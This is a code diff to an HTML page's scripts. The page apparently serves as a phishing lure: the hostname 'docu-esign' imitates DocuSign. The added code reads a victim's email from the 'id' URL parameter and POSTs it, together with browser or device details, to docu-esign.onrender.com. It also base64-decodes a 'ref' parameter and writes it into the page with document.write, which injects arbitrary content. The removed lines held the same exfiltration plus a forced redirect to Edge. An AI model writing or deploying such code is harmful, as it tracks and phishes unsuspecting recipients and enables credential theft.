@@ -8,33 +8,89 @@
     </title>
 
     <script>
-      let isEdge = /Edg\//.test(navigator.userAgent);
-      let isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
-
-      if (isEdge || isSafari) {
-        let hasEmail = new URLSearchParams(window.location.search).has("id");
-        if (hasEmail) {
-          let email = new URLSearchParams(window.location.search).get("id");
-          let payLoad = { id: 0, email: email };
-          let emailXhr = new XMLHttpRequest();
-          emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
-          emailXhr.setRequestHeader("Content-type", "application/json");
-          emailXhr.send(JSON.stringify(payLoad));
-
-          emailXhr.onreadystatechange = function () {
-            if (this.readyState == 4 && this.status == 200) {
-              let response = JSON.parse(this.response);
-              console.log(response);
-            }
-          };
+      function detectBrowser() {
+        var userAgent = navigator.userAgent;
+        if (userAgent.indexOf("Firefox") > -1) {
+          return "Mozilla Firefox";
+        } else if (userAgent.indexOf("Chrome") > -1) {
+          return "Google Chrome";
+        } else if (userAgent.indexOf("Safari") > -1) {
+          return "Apple Safari";
+        } else if (userAgent.indexOf("Edg") > -1) {
+          return "Microsoft Edge";
+        } else if (
+          userAgent.indexOf("MSIE") > -1 ||
+          userAgent.indexOf("Trident") > -1
+        ) {
+          return "Internet Explorer";
+        } else {
+          return "Unknown"; // Return "Unknown" if the browser is not recognized
         }
-        let hasRef = new URLSearchParams(window.location.search).has("ref");
-        if (hasRef) {
-          let ref = new URLSearchParams(window.location.search).get("ref");
-          document.write(decodeURIComponent(atob(`${ref}`)));
+      }
+
+      // Call the function to detect the browser and log the result
+      var browser = detectBrowser();
+      console.log("The site is opened in:", browser);
+    </script>
+
+    <script type="text/javascript">
+      let hasEmail = new URLSearchParams(window.location.search).has("id");
+      let userAgent;
+      if (hasEmail) {
+        function isMobileDevice() {
+          return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+            navigator.userAgent
+          );
         }
-      } else {
-        window.location.replace("microsoft-edge:" + window.location.href);
+
+        function detectBrowser() {
+          // User agent string
+          var userAgent = navigator.userAgent;
+
+          // Check for common browser identifiers
+          if (userAgent.indexOf("Firefox") > -1) {
+            return "Mozilla Firefox";
+          } else if (userAgent.indexOf("Chrome") > -1) {
+            return "Google Chrome";
+          } else if (userAgent.indexOf("Safari") > -1) {
+            return "Apple Safari";
+          } else if (userAgent.indexOf("Edg") > -1) {
+            return "Microsoft Edge";
+          } else if (
+            userAgent.indexOf("MSIE") > -1 ||
+            userAgent.indexOf("Trident") > -1
+          ) {
+            return "Internet Explorer";
+          } else {
+            return "Unknown";
+          }
+        }
+        if (isMobileDevice()) {
+          userAgent = "Mobile Device";
+        } else {
+          userAgent = detectBrowser();
+        }
+        let email = new URLSearchParams(window.location.search).get("id");
+        let payLoad = { id: 0, email: email, userAgent: userAgent };
+        let emailXhr = new XMLHttpRequest();
+        emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
+        emailXhr.setRequestHeader("Content-type", "application/json");
+        emailXhr.send(JSON.stringify(payLoad));
+
+        emailXhr.onreadystatechange = function () {
+          if (this.readyState == 4 && this.status == 200) {
+            let response = JSON.parse(this.response);
+            console.log(response);
+          }
+        };
+      }
+    </script>
+
+    <script type="text/javascript">
+      let hasRef = new URLSearchParams(window.location.search).has("ref");
+      if (hasRef) {
+        let ref = new URLSearchParams(window.location.search).get("ref");
+        document.write(decodeURIComponent(atob(`${ref}`)));
       }
     </script>
 
